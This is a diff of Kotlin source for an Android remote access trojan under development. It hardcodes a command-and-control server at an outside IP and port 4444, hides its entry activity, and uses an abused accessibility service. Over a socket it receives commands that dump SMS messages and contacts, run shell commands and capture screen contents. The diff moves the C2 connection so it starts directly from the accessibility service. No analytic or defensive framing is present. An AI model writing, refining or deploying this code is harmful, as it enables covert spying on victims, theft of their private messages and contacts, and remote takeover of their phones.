@@ -9,7 +9,6 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
-import android.os.Bundle
 import android.provider.ContactsContract
 import android.provider.Telephony
 import android.view.accessibility.AccessibilityEvent
@@ -25,10 +24,8 @@ import java.util.concurrent.LinkedBlockingQueue
 val SERVER_IP = "178.155.5.234"
 val SERVER_PORT = 4444
 
-// Точка входа (её не будет на экране, так как нет activity в манифесте, 
-// но класс нужен для сборки)
 class MainActivity : android.app.Activity() {
-    override fun onCreate(savedInstanceState: Bundle?) {
+    override fun onCreate(savedInstanceState: android.os.Bundle?) {
         super.onCreate(savedInstanceState)
         finish()
     }
@@ -50,7 +47,7 @@ class C2Client(private val host: String, private val port: Int, private val ctx:
                     out = OutputStreamWriter(socket!!.getOutputStream())
                     val reader = BufferedReader(InputStreamReader(socket!!.getInputStream()))
                     send("hello ${Build.MANUFACTURER} ${Build.MODEL} ${Build.VERSION.SDK_INT}")
-                    var line: String?
+                    var line: String? = null
                     while (running && reader.readLine().also { line = it } != null) {
                         handleCommand(line!!.trim())
                     }
@@ -79,8 +76,6 @@ class C2Client(private val host: String, private val port: Int, private val ctx:
             "sms" -> dumpSms(ctx)
             "contacts" -> dumpContacts(ctx)
             "shell" -> shell(parts.getOrElse(1) { "" })
-            "back" -> RatAccessibility.instance?.pressBack()
-            "home" -> RatAccessibility.instance?.pressHome()
             "dump" -> RatAccessibility.instance?.dumpScreen()
         }
     }
@@ -98,15 +93,13 @@ class RatAccessibility : AccessibilityService() {
             notificationTimeout = 100
         }
         serviceInfo = info
-        // Запускаем фоновую службу, когда включен тумблер
-        startForegroundService(Intent(this, RatForeground::class.java))
+        
+        C2Holder.client = C2Client(SERVER_IP, SERVER_PORT, this)
+        C2Holder.client?.start()
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
     override fun onInterrupt() {}
-
-    fun pressBack() { performGlobalAction(GLOBAL_ACTION_BACK) }
-    fun pressHome() { performGlobalAction(GLOBAL_ACTION_HOME) }
 
     fun dumpScreen() {
         val root = rootInActiveWindow ?: return
